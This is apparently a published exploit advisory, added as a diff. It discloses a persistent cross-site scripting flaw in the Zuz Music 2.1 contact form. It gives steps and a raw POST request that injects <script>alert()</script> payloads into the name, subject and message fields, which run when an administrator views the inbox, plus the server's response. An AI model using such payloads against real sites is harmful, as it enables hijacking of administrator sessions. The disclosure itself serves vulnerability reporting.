@@ -1,0 +1,54 @@
+# Exploit Title: Zuz Music 2.1 - 'zuzconsole/___contact ' Persistent Cross-site Scripting
+# Google Dork: N/A
+# Date: 14 Feb 2019
+# Exploit Author: Deyaa Muhammad
+# Author EMail: contact [at] deyaa.me
+# Author Blog: http://deyaa.me
+# Vendor Homepage: https://zuz.host/
+# Software Link: https://codecanyon.net/item/zuz-music-advance-music-platform-system/21633476
+# Version: 2.1
+# Tested on: WIN7_x68/Linux
+# CVE : N/A
+
+# Description:
+----------------------
+ZuzMusic 2.1 suffers from a persistent Cross-Site Scripting vulnerability.
+
+# POC:
+----------------------
+1. Go To https://[PATH]/contact
+2. There are three vulnerable parameters  name, subject and message.
+3. Inject the JavaScript code.
+4. The Injected JavaScript code will be executed when the Administrator open the malicious message https://demos.zuz.host/gmusic/admin/inbox.
+
+# Request:
+----------------------
+POST /gmusic/zuzconsole/___contact HTTP/1.1
+Host: server
+Connection: close
+Content-Length: 155
+Accept: application/json, text/plain, */*
+Origin: https://demos.zuz.host
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Referer: https://server/gmusic/contact
+Accept-Encoding: gzip, deflate
+X-XSS-Protection: 0
+
+{"type":"general","name":"<script>alert(0)</script>","mail":"mail@example.com","subject":"<script>alert(1)</script>","message":"<script>alert(2)</script>"}
+
+
+# Response:
+----------------------
+HTTP/1.1 200 OK
+Date: Fri, 15 Feb 2019 01:30:19 GMT
+Server: Apache
+Connection: close
+Content-Type: application/json
+Content-Length: 183
+
+{
+    "kind": "zuz#contactMessageSent",
+    "etag": "hnwdHsGYwqI6CCSoRSXDMG1BEDTbMMFrOcayLdTYeOs",
+    "message": "We have recieved your query and will get back to you in 24 hours."
+}
